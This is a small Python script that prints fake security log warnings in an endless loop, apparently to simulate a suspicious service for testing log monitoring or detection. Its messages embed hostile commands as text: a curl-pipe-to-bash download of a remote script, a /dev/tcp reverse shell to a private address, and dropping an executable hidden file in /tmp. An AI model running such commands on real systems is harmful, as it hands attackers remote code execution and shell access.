import time
from datetime import datetime
import random

events = [
    ("WARN", "Detected suspicious shell pipeline: curl http://example.com/payload.sh | bash"),
    ("WARN", "Suspicious encoding pattern observed: echo ZWNobyBoZWxsbyA= | base64 -d"),
    ("ERROR", "Potential reverse shell string: bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"),
    ("WARN", "Writes to /tmp observed: /tmp/.x, chmod +x /tmp/.x"),
    ("INFO", "Unusual child process spawn detected (simulated)"),
    ("WARN", "Attempt to fetch remote script (simulated)"),
]

while True:
    ts = datetime.utcnow().isoformat() + "Z"
    level, msg = random.choice(events)
    print(f"{ts} [{level}] suspicious_service: {msg}", flush=True)
    time.sleep(random.uniform(0.7, 1.6))

